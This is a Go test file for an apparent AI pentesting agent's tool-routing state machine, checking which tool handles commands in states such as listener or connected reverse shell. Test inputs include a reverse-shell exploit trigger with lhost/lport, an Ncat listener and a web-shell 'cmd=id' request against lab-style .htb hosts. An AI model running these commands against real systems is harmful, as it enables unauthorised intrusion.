package app

import (
	"strings"
	"testing"
)

func TestAdviseTerminalRunStateMachine(t *testing.T) {
	cases := []struct {
		name            string
		state           TerminalStateSnapshot
		command         string
		allowed         bool
		recommendedTool string
		want            string
	}{
		{
			name:    "ready allows live command",
			state:   TerminalStateSnapshot{State: "ready", Summary: "ready"},
			command: "id",
			allowed: true,
		},
		{
			name:            "running redirects to read",
			state:           TerminalStateSnapshot{State: "running", Summary: "busy"},
			command:         "nmap -sV 10.10.10.10",
			recommendedTool: "terminal_read",
			want:            "already running",
		},
		{
			name:            "listener redirects reverse shell trigger to separate shell",
			state:           TerminalStateSnapshot{State: "listener", Summary: "listening"},
			command:         "python3 exploit.py --lhost 10.10.15.223 --lport 4444",
			recommendedTool: "shell",
			want:            "http_probe, shell, or a separate webshell path",
		},
		{
			name:    "connected session allows terminal input",
			state:   TerminalStateSnapshot{State: "connected", Summary: "session"},
			command: "whoami",
			allowed: true,
			want:    "connected live shell",
		},
		{
			name:            "connected independent http routes to probe",
			state:           TerminalStateSnapshot{State: "connected", Summary: "session"},
			command:         "curl -sk https://connected.htb/ | head -20",
			recommendedTool: "http_probe",
			want:            "independent local/probe command",
		},
		{
			name:            "connected independent local routes to shell",
			state:           TerminalStateSnapshot{State: "connected", Summary: "session"},
			command:         "grep connected /etc/hosts",
			recommendedTool: "shell",
			want:            "separate one-shot",
		},
		{
			name:            "interactive prompt redirects to send",
			state:           TerminalStateSnapshot{State: "interactive_prompt", Summary: "Password:"},
			command:         "whoami",
			recommendedTool: "terminal_send",
			want:            "waiting for input",
		},
		{
			name:            "busy redirects to read or recover",
			state:           TerminalStateSnapshot{State: "busy", Summary: "no prompt"},
			command:         "whoami",
			recommendedTool: "terminal_read",
			want:            "no clean prompt",
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := adviseTerminalRun(tc.state, tc.command)
			if got.Allowed != tc.allowed {
				t.Fatalf("Allowed=%v, want %v (%#v)", got.Allowed, tc.allowed, got)
			}
			if got.RecommendedTool != tc.recommendedTool {
				t.Fatalf("RecommendedTool=%q, want %q (%#v)", got.RecommendedTool, tc.recommendedTool, got)
			}
			if tc.want != "" && !strings.Contains(got.Message, tc.want) {
				t.Fatalf("Message missing %q: %#v", tc.want, got)
			}
		})
	}
}

func TestAdviseStartListenerStateMachine(t *testing.T) {
	cases := []struct {
		name            string
		state           TerminalStateSnapshot
		allowed         bool
		recommendedTool string
		want            string
	}{
		{
			name:    "ready allows listener",
			state:   TerminalStateSnapshot{State: "ready"},
			allowed: true,
		},
		{
			name:            "existing listener blocks duplicate",
			state:           TerminalStateSnapshot{State: "listener"},
			recommendedTool: "terminal_read",
			want:            "already appears",
		},
		{
			name:            "connected session blocks replacement",
			state:           TerminalStateSnapshot{State: "connected"},
			recommendedTool: "terminal_send",
			want:            "live shell",
		},
		{
			name:            "running blocks listener",
			state:           TerminalStateSnapshot{State: "running"},
			recommendedTool: "terminal_read",
			want:            "already running",
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := adviseStartListener(tc.state)
			if got.Allowed != tc.allowed {
				t.Fatalf("Allowed=%v, want %v (%#v)", got.Allowed, tc.allowed, got)
			}
			if got.RecommendedTool != tc.recommendedTool {
				t.Fatalf("RecommendedTool=%q, want %q (%#v)", got.RecommendedTool, tc.recommendedTool, got)
			}
			if tc.want != "" && !strings.Contains(got.Message, tc.want) {
				t.Fatalf("Message missing %q: %#v", tc.want, got)
			}
		})
	}
}

func TestAdviseTerminalSendStateMachine(t *testing.T) {
	cases := []struct {
		name            string
		state           TerminalStateSnapshot
		args            terminalSendArgs
		allowed         bool
		recommendedTool string
		want            string
	}{
		{
			name:            "ready command redirects to run",
			state:           TerminalStateSnapshot{State: "ready"},
			args:            terminalSendArgs{Keys: "nmap -sV 10.10.10.10"},
			recommendedTool: "terminal_send",
			want:            "new command",
		},
		{
			name:    "connected allows session input",
			state:   TerminalStateSnapshot{State: "connected"},
			args:    terminalSendArgs{Keys: "id"},
			allowed: true,
		},
		{
			name:    "prompt allows answer",
			state:   TerminalStateSnapshot{State: "interactive_prompt"},
			args:    terminalSendArgs{Keys: "yes"},
			allowed: true,
		},
		{
			name:            "running command redirects to read",
			state:           TerminalStateSnapshot{State: "running"},
			args:            terminalSendArgs{Keys: "whoami"},
			recommendedTool: "terminal_read",
			want:            "running",
		},
		{
			name:    "running ctrl-c allowed",
			state:   TerminalStateSnapshot{State: "running"},
			args:    terminalSendArgs{Control: "c"},
			allowed: true,
		},
		{
			name:    "busy enter recovery allowed",
			state:   TerminalStateSnapshot{State: "busy"},
			args:    terminalSendArgs{Key: "enter"},
			allowed: true,
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := adviseTerminalSend(tc.state, tc.args)
			if got.Allowed != tc.allowed {
				t.Fatalf("Allowed=%v, want %v (%#v)", got.Allowed, tc.allowed, got)
			}
			if got.RecommendedTool != tc.recommendedTool {
				t.Fatalf("RecommendedTool=%q, want %q (%#v)", got.RecommendedTool, tc.recommendedTool, got)
			}
			if tc.want != "" && !strings.Contains(got.Message, tc.want) {
				t.Fatalf("Message missing %q: %#v", tc.want, got)
			}
		})
	}
}

func TestAdviseShellCallStateMachine(t *testing.T) {
	got := adviseShellCall(TerminalStateSnapshot{State: "connected"}, "whoami")
	if got.Allowed || got.RecommendedTool != "terminal_send" {
		t.Fatalf("connected session command should route to terminal_send: %#v", got)
	}
	got = adviseShellCall(TerminalStateSnapshot{State: "listener"}, "python3 exploit.py --lhost 10.10.15.223 --lport 4444")
	if !got.Allowed || !strings.Contains(got.Message, "trigger path") {
		t.Fatalf("reverse-shell trigger should be allowed through separate shell path: %#v", got)
	}
	got = adviseShellCall(TerminalStateSnapshot{State: "connected"}, "curl -sk http://connected.htb/")
	if !got.Allowed {
		t.Fatalf("separate local one-shot should be allowed while connected: %#v", got)
	}
}

func TestAdviseTerminalRunAllowsConnectedSessionInput(t *testing.T) {
	got := adviseTerminalRun(TerminalStateSnapshot{State: "connected"}, "id")
	if !got.Allowed {
		t.Fatalf("terminal_send command should drive connected sessions, got %#v", got)
	}
}

func TestTerminalRunIndependentCommandBlockMentionsEscaping(t *testing.T) {
	got := adviseTerminalRun(TerminalStateSnapshot{State: "connected"}, "curl -sk https://connected.htb/ 2&gt;&amp;1")
	if got.Allowed || got.RecommendedTool != "http_probe" {
		t.Fatalf("curl should route away from connected terminal: %#v", got)
	}
	out := formatToolExecutionBlock(got, TerminalStateSnapshot{State: "connected", Summary: "live session"})
	for _, want := range []string{"recommended=http_probe", "independent local/probe command", "write &, >, < literally", "do not add &amp;"} {
		if !strings.Contains(out, want) {
			t.Fatalf("block missing %q:\n%s", want, out)
		}
	}
}

func TestConnectedTerminalCurlRedirectsToHTTPProbe(t *testing.T) {
	got := adviseTerminalRun(TerminalStateSnapshot{State: "connected", Summary: "live reverse shell"}, `curl -sk "https://connected.htb/shell.php?cmd=id"`)
	if got.Allowed {
		t.Fatalf("connected terminal curl must not be allowed through terminal_send: %#v", got)
	}
	if got.RecommendedTool != "http_probe" {
		t.Fatalf("connected terminal curl recommended %q, want http_probe: %#v", got.RecommendedTool, got)
	}
	if !strings.Contains(got.Message, "independent local/probe command") || !strings.Contains(got.Message, "http_probe") {
		t.Fatalf("message should explain http_probe redirect:\n%s", got.Message)
	}
}

func TestFormatToolExecutionBlockIncludesDecisionAndTail(t *testing.T) {
	out := formatToolExecutionBlock(toolExecutionDecision{
		Allowed:         false,
		State:           "listener",
		RecommendedTool: "terminal_read",
		Message:         "inspect active session",
	}, TerminalStateSnapshot{
		State:   "listener",
		Summary: "Ncat is listening",
		Lines:   []string{"Ncat: Listening on 0.0.0.0:4444"},
	})
	for _, want := range []string{"tool_state_machine", "allowed=false", "recommended=terminal_read", "Ncat is listening", "Ncat: Listening"} {
		if !strings.Contains(out, want) {
			t.Fatalf("output missing %q:\n%s", want, out)
		}
	}
}
